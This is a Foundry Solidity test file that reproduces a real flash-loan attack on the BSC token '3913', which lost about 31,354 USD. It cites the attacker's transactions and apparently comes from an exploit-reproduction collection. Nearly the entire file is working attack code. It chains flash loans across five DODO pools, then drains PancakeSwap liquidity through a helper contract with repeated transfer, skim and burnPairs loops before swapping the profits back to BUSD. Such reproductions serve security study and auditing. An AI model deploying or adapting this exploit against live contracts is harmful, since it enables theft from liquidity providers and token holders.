// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~31,354 USD$
// Attacker : https://bscscan.com/tx/0xb29f18b89e56cc0151c7c17de0625a21018d8ae7
// Attack Contract : https://bscscan.com/address/0x783fbea45b32eaaa596b44412041dd1208025e83
// Attacker Transaction :
// https://bscscan.com/tx/0x8163738d6610ca32f048ee9d30f4aa1ffdb3ca1eddf95c0eba086c3e936199ed

// @Analysis
// https://defimon.xyz/attack/bsc/0x8163738d6610ca32f048ee9d30f4aa1ffdb3ca1eddf95c0eba086c3e936199ed

// The hacker sent multiple transactions to attack, just taking the first transaction as an example.

interface IDodo {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface I3913 is IERC20 {
    function burnPairs() external;
}

contract Exploit is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    I3913 vulnerable = I3913(0xd74F28c6E0E2c09881Ef2d9445F158833c174775);
    IPancakePair pair = IPancakePair(0x715762906489D5D671eA3eC285731975DA617583);
    IPancakePair pair3913to9419 = IPancakePair(0xd6d66e1993140966e6029815eDbB246800928969);
    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    address dodo1 = 0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d;
    address dodo2 = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;
    address dodo3 = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
    address dodo4 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
    address dodo5 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
    IERC20 busd = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 token9419 = IERC20(0x86335cb69e4E28fad231dAE3E206ce90849a5477);
    uint256 dodo1FlashLoanAmount;
    uint256 dodo2FlashLoanAmount;
    uint256 dodo3FlashLoanAmount;
    uint256 dodo4FlashLoanAmount;
    uint256 dodo5FlashLoanAmount;

    function setUp() public {
        cheats.createSelectFork("bsc", 33_132_467);
        cheats.label(address(vulnerable), "3913");
        cheats.label(address(pair), "pair");
        cheats.label(address(token9419), "9419");
    }

    function testExploit() public {
        deal(address(busd), address(this), 0);
        emit log_named_decimal_uint(
            "attacker balance busd before attack:", busd.balanceOf(address(this)), busd.decimals()
        );
        dodo1FlashLoanAmount = busd.balanceOf(dodo1);
        IDodo(dodo1).flashLoan(0, dodo1FlashLoanAmount, address(this), new bytes(1));
        emit log_named_decimal_uint(
            "attacker balance busd after attack:", busd.balanceOf(address(this)), busd.decimals()
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (msg.sender == dodo1) {
            dodo2FlashLoanAmount = busd.balanceOf(dodo2);
            IDodo(dodo2).flashLoan(0, dodo2FlashLoanAmount, address(this), new bytes(1));
            busd.transfer(dodo1, dodo1FlashLoanAmount);
        } else if (msg.sender == dodo2) {
            dodo3FlashLoanAmount = busd.balanceOf(dodo3);
            IDodo(dodo3).flashLoan(0, dodo3FlashLoanAmount, address(this), new bytes(1));
            busd.transfer(dodo2, dodo2FlashLoanAmount);
        } else if (msg.sender == dodo3) {
            dodo4FlashLoanAmount = busd.balanceOf(dodo4);
            IDodo(dodo4).flashLoan(0, dodo4FlashLoanAmount, address(this), new bytes(1));
            busd.transfer(dodo3, dodo3FlashLoanAmount);
        } else if (msg.sender == dodo4) {
            dodo5FlashLoanAmount = busd.balanceOf(dodo5);
            IDodo(dodo5).flashLoan(0, dodo5FlashLoanAmount, address(this), new bytes(1));
            busd.transfer(dodo4, dodo4FlashLoanAmount);
        } else if (msg.sender == dodo5) {
            //end of flash loan
            busd.approve(address(pair), type(uint256).max);
            busd.approve(address(router), type(uint256).max);

            address[] memory path = new address[](2);
            path[0] = address(busd);
            path[1] = address(vulnerable);
            router.swapExactTokensForTokens(10 ether, 0, path, address(this), block.timestamp + 100);
            path[1] = address(token9419);
            router.swapExactTokensForTokens(10 ether, 0, path, address(this), block.timestamp + 100);
            NewContract x = new NewContract();

            vulnerable.transfer(address(x), 1 ether);

            x.transferToken(address(vulnerable), address(this));
            path[1] = address(vulnerable);
            router.swapExactTokensForTokens(
                358_631_959_260_537_946_706_184, 0, path, address(this), block.timestamp + 100
            );
            busd.transfer(address(pair), 1);
            assertEq(vulnerable.balanceOf(address(this)), 650_501_978_825_924_088_488_444_996_953);
            vulnerable.transfer(address(pair), vulnerable.balanceOf(address(this)));
            pair.skim(address(x));

            uint8 i = 0;
            while (i < 10) {
                x.transferToken(address(vulnerable), address(this));
                if (vulnerable.balanceOf(address(0x570C19331c1B155C21ccD6C2D8e264785cc6F015)) != 1e15) {
                    busd.transfer(address(pair), 1);
                    vulnerable.transfer(address(pair), vulnerable.balanceOf(address(this)));
                    pair.skim(address(x));
                } else {
                    vulnerable.burnPairs();
                }
                i++;
            }
            assertEq(vulnerable.balanceOf(address(this)), 873_285_322_509_556_749_289_919_955_755);
            path[0] = address(vulnerable);
            path[1] = address(busd);
            uint256[] memory amountOut = router.getAmountsOut(vulnerable.balanceOf(address(this)) * 98 / 100, path);
            assertEq(amountOut[0], 855_819_616_059_365_614_304_121_556_639);

            busd.transfer(address(pair), 1);
            vulnerable.transfer(address(pair), amountOut[0]);

            assertEq(amountOut[1] * 99 / 100, 386_867_521_275_785_735_087_292);
            (uint112 res0, uint112 res1,) = pair.getReserves();
            assertEq(res0, 585_082_814_956_957_699_188_861);
            assertEq(res1, 424_480_476_638_586_992_222_101_033_564);
            assert(amountOut[1] * 99 / 100 < res0);
            assertEq(pair.token0(), address(busd));
            pair.swap(amountOut[1] * 99 / 100, 0, address(this), new bytes(0));
            path[0] = address(vulnerable);
            path[1] = address(token9419);
            amountOut = router.getAmountsOut(vulnerable.balanceOf(address(this)), path);
            token9419.transfer(address(pair3913to9419), 1);
            vulnerable.transfer(address(pair3913to9419), vulnerable.balanceOf(address(this)));
            (res0, res1,) = pair3913to9419.getReserves();
            assert(res0 > amountOut[1] * 99 / 100);
            assertEq(pair3913to9419.token0(), address(token9419));
            assertEq(amountOut[1] * 99 / 100, 278_798_044_220_113_865_039_589_361_218);

            pair3913to9419.swap(amountOut[1] * 99 / 100, 0, address(this), new bytes(0));
            //
            path[0] = address(token9419);
            path[1] = address(busd);
            token9419.approve(address(router), type(uint256).max);
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                token9419.balanceOf(address(this)), 0, path, address(this), block.timestamp + 100
            );
            busd.transfer(dodo5, dodo5FlashLoanAmount);
        }
    }
}

contract NewContract {
    function transferToken(address token, address destination) external {
        uint256 bal = I3913(token).balanceOf(address(this));
        I3913(token).transfer(destination, bal);
    }
}
